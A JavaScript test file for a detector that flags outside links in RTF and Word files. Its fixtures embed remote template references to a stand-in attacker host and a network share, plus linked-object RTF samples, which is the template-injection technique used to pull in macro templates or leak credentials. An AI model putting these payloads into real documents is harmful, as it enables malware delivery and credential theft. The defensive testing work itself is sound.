const test = require('node:test');
const assert = require('node:assert');
const { inspectRtf, inspectDocument } = require('../lib/doc-links');
const { buildDocx, outside } = require('./zip-builder');

// RTF files: Word follows an attached template named in an RTF file just like in a .docx (checked with real Word).
// Each backslash below is written twice because this is JavaScript text: the file really contains one.

test('an RTF with a remote template, a network-share template, or a linked object is found', () => {
  assert.strictEqual(inspectRtf(Buffer.from('{\\rtf1\\ansi{\\*\\template http://evil.example/t.dotm}Hello}')).links.length, 1);
  assert.strictEqual(inspectRtf(Buffer.from('{\\rtf1\\ansi{\\*\\template \\\\\\\\evil\\\\share\\\\t.dotm}Hello}')).links.length, 1, 'a network share, written the RTF way');
  assert.strictEqual(inspectRtf(Buffer.from('{\\rtf1{\\*\\template file:///\\\\\\\\evil\\\\share\\\\t.dotm}x}')).links.length, 1);
  assert.strictEqual(inspectRtf(Buffer.from('{\\rtf1{\\object\\objautlink\\objupdate{\\*\\objclass Word.Document.12}}x}')).links.length, 1);
  assert.strictEqual(inspectRtf(Buffer.from('{\\rtf1{\\object\\objlink{\\*\\objclass Word.Document.12}}x}')).links.length, 1);
});

test('an ordinary RTF, and one with a template on this computer (as Word itself saves), have no outside links', () => {
  assert.deepStrictEqual(inspectRtf(Buffer.from('{\\rtf1\\ansi Hello world.\\par}')), { isRtf: true, links: [] });
  const saved = '{\\rtf1\\ansi{\\*\\template C:\\\\Users\\\\Me\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\\\\Normal.dotm}Hello}';
  assert.deepStrictEqual(inspectRtf(Buffer.from(saved)).links, []);
});

test('the RTF mark is found even after a few blank lines, and something else is not called RTF', () => {
  assert.strictEqual(inspectRtf(Buffer.from('\r\n  {\\rtf1{\\*\\template http://evil.example/t.dotm}x}')).links.length, 1);
  assert.deepStrictEqual(inspectRtf(Buffer.from('plain text with \\template in it')), { isRtf: false, links: [] });
});

test('the bytes under test really are RTF (guards against this file losing its backslashes)', () => {
  const sample = '{\\rtf1\\ansi{\\*\\template http://evil.example/t.dotm}Hello}';
  assert.strictEqual(sample.slice(0, 6), '{' + String.fromCharCode(92) + 'rtf1');
  assert.strictEqual(sample.includes(String.fromCharCode(13)), false, 'no stray line-break character');
});

test('one entry point sorts a file by what it really is', () => {
  const docx = buildDocx([outside('rId1', 'attachedTemplate', 'http://evil.example/t.dotm')]);
  assert.strictEqual(inspectDocument(docx).kind, 'zip');
  assert.strictEqual(inspectDocument(docx).links.length, 1);
  const rtf = inspectDocument(Buffer.from('{\\rtf1{\\*\\template http://evil.example/t.dotm}x}'));
  assert.strictEqual(rtf.kind, 'rtf');
  assert.strictEqual(rtf.links.length, 1);
  assert.deepStrictEqual(inspectDocument(Buffer.from('just text')), { kind: 'other', unreadable: false, links: [] });
});
